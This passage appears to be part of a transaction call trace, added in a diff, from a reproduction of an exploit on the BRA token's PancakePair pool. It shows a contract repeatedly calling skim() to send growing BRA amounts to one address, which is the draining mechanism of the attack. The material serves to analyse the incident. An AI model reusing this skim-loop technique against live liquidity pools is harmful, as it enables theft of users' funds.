+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 52142393722530795770318
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 43551251917740875552277) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 53448931280063022036818
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 44857789475273101818777) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 54794664964321215091118
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 46203523159531294873077) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 56180770659107153937218
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 47589628854317233719177) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 57608459524736670948518
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 49017317719946750730477) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 59078979056335073470418
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 50487837251545153252377) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 60593614173881428067918
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 52002472369091507849877) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 62153688344954173303118
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 53562546540164253085077) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 63760564741159100895518
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 55169422936369180677477) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 65415647429250176315618
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 56824505624460256097577) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 67120382597983983998318
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 58529240793194063780277) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 68876259821779805911718
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 60285118016989885693677) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 70684813362289502482418
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 62093671557499582264377) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 72547623509014489950218
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 63956481704224569732177) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 74466317960141227042118
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 65875176155351306824077) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 76442573244801766246718
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 67851431440011846028677) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 78478116188002121627318
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 69886974383212201409277) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 80574725419498487669318
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 71983583614708567451277) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 82734232927939744692818
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 74143091123149824474777) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 84958525661634239426918
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 76367383856844319208877) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 87249547177339569002918
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 78658405372549648784877) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 89609299338516058466318
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 81018157533726138248277) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 92039844064527842613518
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 83448702259737922395477) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 94543305132319980285218
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 85952163327530060067177) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 97121870032145882087018
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 88530728227355961868977) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 99777791878966560942818
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 91186650074176640724777) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
